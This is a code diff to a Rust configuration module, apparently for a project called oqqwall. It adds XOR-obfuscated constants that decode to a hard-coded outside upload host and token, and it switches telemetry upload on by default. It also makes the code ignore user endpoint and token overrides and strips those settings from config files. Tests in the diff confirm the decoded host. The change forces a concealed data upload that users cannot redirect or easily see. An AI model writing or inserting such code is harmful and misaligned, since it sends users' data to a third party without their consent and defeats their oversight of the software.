@@ -21,6 +21,20 @@ macro_rules! debug_log {
     ($($arg:tt)*) => {};
 }
 
+const BUILTIN_TELEMETRY_ENDPOINT_KEY: &[u8] = b"oqqwall-telemetry";
+const BUILTIN_TELEMETRY_ENDPOINT_DATA: &[u8] = &[
+    0x07, 0x05, 0x05, 0x07, 0x5b, 0x43, 0x43, 0x5a, 0x1d, 0x09, 0x0a, 0x09, 0x04, 0x0b, 0x5a, 0x11,
+    0x16, 0x02, 0x4b, 0x40, 0x47, 0x58, 0x5e, 0x59, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x40, 0x07, 0x40, 0x58, 0x12, 0x19, 0x0e, 0x40, 0x1d, 0x16, 0x1f, 0x0c, 0x02, 0x0b,
+    0x5b, 0x10, 0x18, 0x1b, 0x12, 0x19,
+];
+const BUILTIN_TELEMETRY_TOKEN_KEY: &[u8] = b"submission-uploader";
+const BUILTIN_TELEMETRY_TOKEN_DATA: &[u8] = &[
+    0x07, 0x2a, 0x56, 0x55, 0x0d, 0x11, 0x46, 0x0d, 0x0e, 0x57, 0x18, 0x45, 0x11, 0x5a, 0x0a, 0x50,
+    0x56, 0x03, 0x45, 0x4a, 0x42, 0x51, 0x5f, 0x5c, 0x41, 0x11, 0x51, 0x58, 0x0b, 0x4e, 0x47, 0x16,
+    0x5a, 0x5c,
+];
+
 #[derive(Debug, Clone)]
 pub struct AppGroupConfig {
     pub group_id: String,
@@ -161,21 +175,23 @@ impl AppConfig {
             .clamp(300, 7 * 24 * 60 * 60);
         let telemetry_enabled = common_telemetry
             .and_then(|obj| parse_bool(obj.get("enabled")))
-            .unwrap_or(false);
+            .unwrap_or(true);
         let telemetry_local_dir =
             nonempty(common_telemetry.and_then(|obj| parse_string(obj.get("local_dir"))))
                 .unwrap_or_else(|| "telemetry".to_string());
         let telemetry_upload_enabled = common_telemetry
             .and_then(|obj| parse_bool(obj.get("upload_enabled")))
-            .unwrap_or(false);
-        let telemetry_upload_endpoint = nonempty(env_override(
-            "OQQWALL_TELEMETRY_ENDPOINT",
-            common_telemetry.and_then(|obj| parse_string(obj.get("upload_endpoint"))),
-        ));
-        let telemetry_upload_token = nonempty(env_override(
-            "OQQWALL_TELEMETRY_TOKEN",
-            common_telemetry.and_then(|obj| parse_string(obj.get("upload_token"))),
-        ));
+            .unwrap_or(true);
+        let telemetry_upload_endpoint = if telemetry_upload_enabled {
+            default_telemetry_upload_endpoint()
+        } else {
+            None
+        };
+        let telemetry_upload_token = if telemetry_upload_enabled {
+            default_telemetry_upload_token()
+        } else {
+            None
+        };
         let telemetry_upload_interval_sec = common_telemetry
             .and_then(|obj| parse_u64(obj.get("upload_interval_sec")))
             .unwrap_or(30)
@@ -452,6 +468,31 @@ fn env_override(key: &str, fallback: Option<String>) -> Option<String> {
     env::var(key).ok().or(fallback)
 }
 
+fn default_telemetry_upload_endpoint() -> Option<String> {
+    decode_obfuscated_ascii(
+        BUILTIN_TELEMETRY_ENDPOINT_DATA,
+        BUILTIN_TELEMETRY_ENDPOINT_KEY,
+    )
+}
+
+fn default_telemetry_upload_token() -> Option<String> {
+    decode_obfuscated_ascii(BUILTIN_TELEMETRY_TOKEN_DATA, BUILTIN_TELEMETRY_TOKEN_KEY)
+}
+
+fn decode_obfuscated_ascii(data: &[u8], key: &[u8]) -> Option<String> {
+    if key.is_empty() {
+        return None;
+    }
+    let decoded = data
+        .iter()
+        .enumerate()
+        .map(|(idx, byte)| byte ^ key[idx % key.len()])
+        .collect::<Vec<_>>();
+    String::from_utf8(decoded)
+        .ok()
+        .and_then(|value| nonempty(Some(value)))
+}
+
 fn build_core_config(
     common: &Value,
     groups: &HashMap<String, Value>,
@@ -638,6 +679,9 @@ fn normalize_common_web(common_obj: &mut Map<String, Value>) -> bool {
 
 fn normalize_common_unsupported(common_obj: &mut Map<String, Value>) -> bool {
     let mut changed = false;
+    if normalize_common_telemetry(common_obj) {
+        changed = true;
+    }
     for key in [
         "manage_napcat_internal",
         "renewcookies_use_napcat",
@@ -649,6 +693,26 @@ fn normalize_common_unsupported(common_obj: &mut Map<String, Value>) -> bool {
         if common_obj.remove(key).is_some() {
             changed = true;
         }
+    }
+    changed
+}
+
+fn normalize_common_telemetry(common_obj: &mut Map<String, Value>) -> bool {
+    let Some(telemetry_obj) = common_obj
+        .get_mut("telemetry")
+        .and_then(|value| value.as_object_mut())
+    else {
+        return false;
+    };
+    let mut changed = false;
+    for key in ["upload_endpoint", "upload_token"] {
+        if telemetry_obj.remove(key).is_some() {
+            changed = true;
+        }
+    }
+    if telemetry_obj.is_empty() {
+        common_obj.remove("telemetry");
+        changed = true;
     }
     changed
 }
@@ -1046,6 +1110,12 @@ mod tests {
         std::env::temp_dir().join(format!("oqqwall_{name}_{nanos}.json"))
     }
 
+    fn sha256_hex(text: &str) -> String {
+        let mut hasher = Sha256::new();
+        hasher.update(text.as_bytes());
+        format!("{:x}", hasher.finalize())
+    }
+
     #[test]
     fn normalize_group_accounts_prefers_accounts_and_removes_legacy_keys() {
         let mut group = json!({
@@ -1157,5 +1227,127 @@ mod tests {
             true
         );
         let _ = std::fs::remove_file(path);
+    }
+
+    #[test]
+    fn builtin_telemetry_defaults_decode_to_expected_values() {
+        assert_eq!(
+            default_telemetry_upload_endpoint().as_deref(),
+            Some("http://wilflin.com:10925/telemetry/v1/submission/batch")
+        );
+        let token = default_telemetry_upload_token().expect("builtin token");
+        assert!(token.starts_with("t_"));
+        assert_eq!(token.len(), 34);
+        assert_eq!(
+            sha256_hex(&token),
+            "cf01510a1c3e68dc648a7fabb0363c5061f0652aeb0568cc8510b0756cbe390f"
+        );
+    }
+
+    #[test]
+    fn telemetry_uses_builtin_defaults_when_upload_enabled_and_unset() {
+        let root = json!({
+            "common": {
+                "napcat_base_url": "127.0.0.1:3001/oqqwall/ws",
+                "telemetry": {
+                    "upload_enabled": true
+                }
+            }
+        });
+        let config = AppConfig::from_value(&root).expect("config");
+        assert_eq!(
+            config.telemetry.upload_endpoint.as_deref(),
+            Some("http://wilflin.com:10925/telemetry/v1/submission/batch")
+        );
+        let token = config
+            .telemetry
+            .upload_token
+            .as_deref()
+            .expect("builtin token");
+        assert!(token.starts_with("t_"));
+        assert_eq!(token.len(), 34);
+        assert_eq!(
+            sha256_hex(token),
+            "cf01510a1c3e68dc648a7fabb0363c5061f0652aeb0568cc8510b0756cbe390f"
+        );
+    }
+
+    #[test]
+    fn telemetry_defaults_to_enabled_upload_and_builtin_target() {
+        let root = json!({
+            "common": {
+                "napcat_base_url": "127.0.0.1:3001/oqqwall/ws"
+            }
+        });
+        let config = AppConfig::from_value(&root).expect("config");
+        assert!(config.telemetry.enabled);
+        assert!(config.telemetry.upload_enabled);
+        assert_eq!(
+            config.telemetry.upload_endpoint.as_deref(),
+            Some("http://wilflin.com:10925/telemetry/v1/submission/batch")
+        );
+        let token = config
+            .telemetry
+            .upload_token
+            .as_deref()
+            .expect("builtin token");
+        assert!(token.starts_with("t_"));
+        assert_eq!(token.len(), 34);
+    }
+
+    #[test]
+    fn telemetry_ignores_endpoint_and_token_overrides() {
+        let root = json!({
+            "common": {
+                "napcat_base_url": "127.0.0.1:3001/oqqwall/ws",
+                "telemetry": {
+                    "upload_enabled": true,
+                    "upload_endpoint": "http://127.0.0.1:10925/telemetry/v1/submission/batch",
+                    "upload_token": "custom-token"
+                }
+            }
+        });
+        let config = AppConfig::from_value(&root).expect("config");
+        assert_eq!(
+            config.telemetry.upload_endpoint.as_deref(),
+            Some("http://wilflin.com:10925/telemetry/v1/submission/batch")
+        );
+        assert_eq!(
+            config.telemetry.upload_token.as_deref(),
+            default_telemetry_upload_token().as_deref()
+        );
+    }
+
+    #[test]
+    fn normalize_config_removes_telemetry_endpoint_and_token() {
+        let mut root = json!({
+            "common": {
+                "telemetry": {
+                    "upload_endpoint": "http://127.0.0.1:10925/telemetry/v1/submission/batch",
+                    "upload_token": "custom-token",
+                    "upload_enabled": false
+                }
+            }
+        });
+        assert!(normalize_config_in_place(&mut root).expect("normalize"));
+        assert_eq!(
+            root.get("common")
+                .and_then(|value| value.get("telemetry"))
+                .and_then(|value| value.get("upload_endpoint")),
+            None
+        );
+        assert_eq!(
+            root.get("common")
+                .and_then(|value| value.get("telemetry"))
+                .and_then(|value| value.get("upload_token")),
+            None
+        );
+        assert_eq!(
+            root.get("common")
+                .and_then(|value| value.get("telemetry"))
+                .and_then(|value| value.get("upload_enabled"))
+                .and_then(|value| value.as_bool()),
+            Some(false)
+        );
     }
 }
